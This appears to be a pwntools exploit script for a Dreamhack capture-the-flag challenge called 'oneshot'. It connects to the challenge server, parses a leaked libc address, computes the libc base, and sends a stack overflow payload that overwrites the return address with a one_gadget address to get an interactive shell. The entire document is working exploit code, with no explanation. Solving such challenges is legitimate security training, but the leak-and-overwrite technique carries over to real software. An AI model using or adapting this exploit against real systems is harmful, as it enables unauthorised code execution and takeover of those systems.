from pwn import *

exe = ELF('oneshot_patched', checksec=False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 13062)
libc = ELF('libc.so.6', checksec=False)

r.recvuntil(b'stdout: ')
leak = int(r.recvline()[:-1], 16)
log.info("leak address: " + hex(leak))
libc.address = leak - 0x3c5620
log.info("libc base: " + hex(libc.address))

#input()
one_gadget = libc.address + 0x45216
payload = b'a'*24
payload += p64(0)
payload += b'a'*8
payload += p64(one_gadget)
r.sendafter(b'MSG: ', payload)

r.interactive()